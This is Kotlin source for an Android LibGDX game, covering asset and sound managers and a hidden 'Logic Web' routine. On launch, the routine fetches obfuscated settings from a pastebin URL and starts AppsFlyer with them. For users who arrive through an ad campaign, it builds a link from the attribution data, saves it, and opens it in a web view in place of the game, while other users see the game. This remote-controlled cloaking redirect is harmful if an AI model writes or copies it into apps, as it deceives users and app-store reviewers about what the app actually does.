package com.kaskazer.kazmuchero.game

import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity.MODE_PRIVATE
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.kaskazer.kazmuchero.GameActivity
import com.kaskazer.kazmuchero.appContext
import com.kaskazer.kazmuchero.game.dataStore.DataStore
import com.kaskazer.kazmuchero.game.manager.MusicManager
import com.kaskazer.kazmuchero.game.manager.NavigationManager
import com.kaskazer.kazmuchero.game.manager.SoundManager
import com.kaskazer.kazmuchero.game.manager.SpriteManager
import com.kaskazer.kazmuchero.game.manager.util.MusicUtil
import com.kaskazer.kazmuchero.game.manager.util.SoundUtil
import com.kaskazer.kazmuchero.game.manager.util.SpriteUtil
import com.kaskazer.kazmuchero.game.screens.LoaderScreen
import com.kaskazer.kazmuchero.game.utils.GColor
import com.kaskazer.kazmuchero.game.utils.advanced.AdvancedGame
import com.kaskazer.kazmuchero.game.utils.disposeAll
import com.kaskazer.kazmuchero.util.log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

var GLOBAL_isGame = false
    private set

class LibGDXGame(val activity: GameActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val loader by lazy { SpriteUtil.Loader() }
    val all    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil() }
    val soundUtil by lazy { SoundUtil() }

    var backgroundColor = GColor.brawn
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    override fun create() {
        navigationManager = NavigationManager(this)
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        logicMain()
    }

    val sharedPreferences: SharedPreferences = activity.getSharedPreferences("KasKaz", MODE_PRIVATE)

    val dataStore = DataStore(sharedPreferences)

    override fun render() {
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun logicMain() {
        log("logicMain")
        activity.blockRedirect = { GLOBAL_isGame = true }
        activity.initWeb()

        val mainLogic = sharedPreferences.getString("value", "505") ?: "505"

        try {
            if (mainLogic == "505") {
                coroutine.launch(Dispatchers.Main) {
                    val mainJSON = withContext(Dispatchers.IO) { requestGet() }

                    if (mainJSON != null) {
                        AppsFlyerLib.getInstance().init(mainJSON.leyzak, getAppsFlyerConversionListener(mainJSON.kazak), appContext)
                        AppsFlyerLib.getInstance().start(activity, mainJSON.leyzak, getAppsFlyerRequestListener())
                    } else {
                        GLOBAL_isGame = true
                    }
                }
            } else {
                activity.showUrl(mainLogic)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GLOBAL_isGame = true
        }
    }

    private suspend fun requestGet() = CompletableDeferred<GetJSON?>().also { continuation ->
        val urlString = "https://pastebin.com/raw/Q2LTte4J"

        try {
            val url        = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection

            connection.requestMethod           = "GET"
            connection.connectTimeout          = 5000
            connection.readTimeout             = 5000
            connection.instanceFollowRedirects = true

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = StringBuilder()
                var line: String?

                while (reader.readLine().also { line = it } != null) {
                    response.append(line)
                }
                reader.close()

                val jsonResponse = JSONObject(response.toString())
                log("json = $jsonResponse")

                val getJSON = GetJSON(
                    kazak = jsonResponse.getString("kazak")   ?: "",
                    leyzak = jsonResponse.getString("leyzak") ?: "",
                )
                continuation.complete(getJSON)

            } else {
                log("Запит не успішний. Код відповіді: $responseCode")
                continuation.complete(null)
            }
            connection.disconnect()
        } catch (e: Exception) {
            log("Error: ${e.message}")
            e.printStackTrace()
            continuation.complete(null)
        }
    }.await()

    private data class GetJSON(val kazak: String, val leyzak: String)

    private fun getAppsFlyerConversionListener(all: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$all?merlovi=$campaign&trakoun=$afAd&spliver=$media"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("value", link).apply() }
                activity.showUrl(link)

            } else GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }



}